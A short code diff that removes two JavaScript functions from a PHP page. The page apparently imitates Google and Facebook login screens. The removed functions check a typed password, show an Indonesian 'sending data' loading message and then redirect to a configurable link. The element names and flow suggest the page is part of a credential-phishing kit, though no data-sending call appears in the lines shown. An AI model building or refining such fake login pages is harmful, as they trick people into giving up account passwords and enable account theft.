@@ -57,22 +57,6 @@
     });
   }
 
-  function gHandlePassNext() {
-    var inp = document.getElementById('gPassInput');
-    var err = document.getElementById('gPassError');
-    var pass = inp.value;
-    if (pass.length < 8) {
-      inp.classList.add('error','shake');
-      err.textContent = 'Password must have at least 8 characters.';
-      setTimeout(function(){ inp.classList.remove('shake'); }, 400);
-      return;
-    }
-    inp.classList.remove('error'); err.textContent = '';
-    showLoading('gPassLoadingDim','gPassLoadingText','Mengirim data...', function(){
-      window.location.href = '<?php echo $data["linkredirect"]; ?>';
-    });
-  }
-
   function gTogglePass() {
     gPassVisible = !gPassVisible;
     document.getElementById('gPassInput').type = gPassVisible ? 'text' : 'password';
@@ -127,12 +111,6 @@
       document.getElementById('fbcName').textContent = email;
       showStep('stepFBConfirm');
     }, 2000);
-  }
-
-  function fbLanjutkan() {
-    showLoading('fbConfirmLoadingDim','fbConfirmLoadingText','Memproses...', function(){
-      window.location.href = '<?php echo $data["linkredirect"]; ?>';
-    });
   }
 
   function fbTogglePass() {
